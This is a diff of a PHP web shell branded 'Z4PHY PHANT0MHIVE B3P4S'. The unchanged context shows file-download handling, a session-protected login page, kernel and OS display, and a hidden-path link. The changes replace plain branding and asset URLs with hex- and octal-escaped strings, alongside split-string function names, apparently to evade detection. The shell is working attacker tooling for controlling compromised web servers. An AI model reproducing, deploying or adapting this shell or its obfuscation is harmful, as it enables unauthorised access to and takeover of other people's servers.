@@ -1,6 +1,6 @@
 <?php
 /*
-R3C0D3 BY https://t.me/zaynphantomhive Thanks To Nulz Haxorstars
+Z4PHY PHANT0MHIVE B3P4S C0DE
 */
 
 //head
@@ -38,11 +38,12 @@ if (isset($_GET['downloadfile'])) {
         echo '<script>alert("Failed To Download This File :(\n'.$get_file.'"); history.back()</script>';
     }
 }
-//config shell
-$s_he_ll_Name = "$ .: Z4PHY PHANT0MHIVE B3P4S:. $";
-$s_he_ll_Logo = "https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/ciel.png";
-$s_he_ll_Icon = "https://raw.githubusercontent.com/z4phyr/Z4PHY-PHANT0MHIVE/main/z4p-b3p4s/asset/icons.jpg";
-$s_he_ll_Footer = "<div class='p-4 font-bold text-center text-white dark:text-white'>© 2024 Copyright: <a class='text-red-800 dark:text-red-400' href='https://t.me/zaynphantomhive'>Z4PHY PHANT0MMHIVE</a></div>";
+//Config Shell
+$s_he_ll_Title = "\044\040\056\072\040\132\064\120\110\131\040\120\110\101\116\124\060\115\110\111\126\105\040\102\063\120\064\123\072\056\040\044";
+$s_he_ll_Name = "\132\064\120\110\131\040\120\110\064\116\124\060\115\110\111\126\105\040\102\063\120\064\123";
+$s_he_ll_Logo = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x7a\x34\x70\x68\x79\x72\x2f\x5a\x34\x50\x48\x59\x2d\x50\x48\x41\x4e\x54\x30\x4d\x48\x49\x56\x45\x2f\x6d\x61\x69\x6e\x2f\x7a\x34\x70\x2d\x62\x33\x70\x34\x73\x2f\x61\x73\x73\x65\x74\x2f\x63\x69\x65\x6c\x2e\x70\x6e\x67";
+$s_he_ll_Icon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x7a\x34\x70\x68\x79\x72\x2f\x5a\x34\x50\x48\x59\x2d\x50\x48\x41\x4e\x54\x30\x4d\x48\x49\x56\x45\x2f\x6d\x61\x69\x6e\x2f\x7a\x34\x70\x2d\x62\x33\x70\x34\x73\x2f\x61\x73\x73\x65\x74\x2f\x69\x63\x6f\x6e\x73\x2e\x6a\x70\x67";
+$s_he_ll_Footer = "\x3c\x64\x69\x76\x20\x63\x6c\x61\x73\x73\x3d\x27\x70\x2d\x34\x20\x66\x6f\x6e\x74\x2d\x62\x6f\x6c\x64\x20\x74\x65\x78\x74\x2d\x63\x65\x6e\x74\x65\x72\x20\x74\x65\x78\x74\x2d\x77\x68\x69\x74\x65\x20\x64\x61\x72\x6b\x3a\x74\x65\x78\x74\x2d\x77\x68\x69\x74\x65\x27\x3e\xa9\x20\x32\x30\x32\x34\x20\x43\x6f\x70\x79\x72\x69\x67\x68\x74\x3a\x20\x3c\x61\x20\x63\x6c\x61\x73\x73\x3d\x27\x74\x65\x78\x74\x2d\x72\x65\x64\x2d\x38\x30\x30\x20\x64\x61\x72\x6b\x3a\x74\x65\x78\x74\x2d\x72\x65\x64\x2d\x34\x30\x30\x27\x20\x68\x72\x65\x66\x3d\x27\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x2e\x6d\x65\x2f\x7a\x61\x79\x6e\x70\x68\x61\x6e\x74\x6f\x6d\x68\x69\x76\x65\x27\x3e\x5a\x34\x50\x48\x59\x20\x50\x48\x41\x4e\x54\x30\x4d\x4d\x48\x49\x56\x45\x3c\x2f\x61\x3e\x3c\x2f\x64\x69\x76\x3e";
 
 //tailwind config text color
 $txtBlack = "text-black";
@@ -94,10 +95,10 @@ $whiteSemiParent2 = "rgba(255,255,255,0.2)";
 $whiteSemiParent3 = "rgba(255,255,255,0.3)";
 
 //icon config
-$filesIcon = "https://raw.githubusercontent.com/z4phyr/Z4PHY-PHANT0MHIVE/main/z4p-b3p4s/asset/files.png";
-$newFilesIcon = "https://raw.githubusercontent.com/z4phyr/Z4PHY-PHANT0MHIVE/main/z4p-b3p4s/asset/new-files.png";
-$folderIcon = "https://raw.githubusercontent.com/z4phyr/Z4PHY-PHANT0MHIVE/main/z4p-b3p4s/asset/folder.png";
-$newFolderIcon = "https://raw.githubusercontent.com/z4phyr/Z4PHY-PHANT0MHIVE/main/z4p-b3p4s/asset/new-folder.png";
+$filesIcon = "\150\164\164\160\163\072\057\057\162\141\167\056\147\151\164\150\165\142\165\163\145\162\143\157\156\164\145\156\164\056\143\157\155\057\172\064\160\150\171\162\057\132\064\120\110\131\055\120\110\101\116\124\060\115\110\111\126\105\057\155\141\151\156\057\172\064\160\055\142\063\160\064\163\057\141\163\163\145\164\057\146\151\154\145\163\056\160\156\147";
+$newFilesIcon = "\150\164\164\160\163\072\057\057\162\141\167\056\147\151\164\150\165\142\165\163\145\162\143\157\156\164\145\156\164\056\143\157\155\057\172\064\160\150\171\162\057\132\064\120\110\131\055\120\110\101\116\124\060\115\110\111\126\105\057\155\141\151\156\057\172\064\160\055\142\063\160\064\163\057\141\163\163\145\164\057\156\145\167\055\146\151\154\145\163\056\160\156\147";
+$folderIcon = "\150\164\164\160\163\072\057\057\162\141\167\056\147\151\164\150\165\142\165\163\145\162\143\157\156\164\145\156\164\056\143\157\155\057\172\064\160\150\171\162\057\132\064\120\110\131\055\120\110\101\116\124\060\115\110\111\126\105\057\155\141\151\156\057\172\064\160\055\142\063\160\064\163\057\141\163\163\145\164\057\146\157\154\144\145\162\056\160\156\147";
+$newFolderIcon = "\150\164\164\160\163\072\057\057\162\141\167\056\147\151\164\150\165\142\165\163\145\162\143\157\156\164\145\156\164\056\143\157\155\057\172\064\160\150\171\162\057\132\064\120\110\131\055\120\110\101\116\124\060\115\110\111\126\105\057\155\141\151\156\057\172\064\160\055\142\063\160\064\163\057\141\163\163\145\164\057\156\145\167\055\146\157\154\144\145\162\056\160\156\147";
 
 function Z4phyUname() {
     $hayoloh = 'h'.'tm'.'lspe'.'cialc'.'hars';
@@ -480,7 +481,7 @@ if (empty($_SESSION['z4phyc0de'])) {
 
 <head>
     <title>
-        .:<?= $s_he_ll_Name ?> LOGIN:.
+        .:<?= $s_he_ll_Title ?> LOGIN:.
     </title>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -502,7 +503,7 @@ if (empty($_SESSION['z4phyc0de'])) {
     }
 
     body {
-        background-image: url('https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/me.gif'), linear-gradient(rgba(0, 0, 0, 0.5), rgba(255, 255, 255, 0.5));
+        background-image: url('https://i.pinimg.com/originals/45/92/64/45926407d771ede425af70370b8bd99f.gif'), linear-gradient(rgba(0, 0, 0, 0.5), rgba(255, 255, 255, 0.5));
         background-position: center;
         background-size: cover;
         background-repeat: no-repeat;
@@ -772,7 +773,7 @@ if (empty($_SESSION['z4phyc0de'])) {
             <img src="https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/terminal.png"
                 alt="terminal" /><span>Terminal</span>
             <strong>
-                <?= $s_he_ll_Name ?> LOGIN
+                <?= $s_he_ll_Title ?> LOGIN
             </strong>
         </div>
         <div class="root" style="color: #d00c0c"></div>
@@ -831,7 +832,7 @@ $path = str_replace("\\", "/", $path);
 
 <head>
     <title>
-        <?= $s_he_ll_Name.' '.$_SERVER['HTTP_HOST'] ?>
+        <?= $s_he_ll_Title.' '.$_SERVER['HTTP_HOST'] ?>
     </title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -1159,7 +1160,7 @@ $path = str_replace("\\", "/", $path);
 <body>
     <header class="w-full flex flex-row">
         <div class="shell whitespace-nowrap py-2 px-2 flex flex-col">
-            <a href="?hidden&path=<?=$path?>/&z4phy&ph4nt0mhive" class="flex flex-row flex-nowrap"><img class="rounded rounded-xl" style="width: 5vh; height: 5vh;" src="<?=$s_he_ll_Logo?>" alt="LOGO"><h1 class="<?= $txtRed ?> mx-2 fs-super trade-winds"><?= $s_he_ll_Name ?></h1></a>
+            <a href="?hidden&path=<?=$path?>/&Z4PHY" class="flex flex-row flex-nowrap"><img class="rounded rounded-xl" style="width: 5vh; height: 5vh;" src="<?=$s_he_ll_Logo?>" alt="LOGO"><h1 class="<?= $txtRed ?> mx-2 fs-super trade-winds"><?= $s_he_ll_Name ?></h1></a>
             <span class="fs-xl poppins <?= $txtPurple ?>">KERNEL: <?= $kernel ?></span>
             <span class="fs-xl poppins <?= $txtPurple ?>">OS: <font class="ubuntu-mono <?= $txtGreen ?>"><?= $os ?>
                 </font>
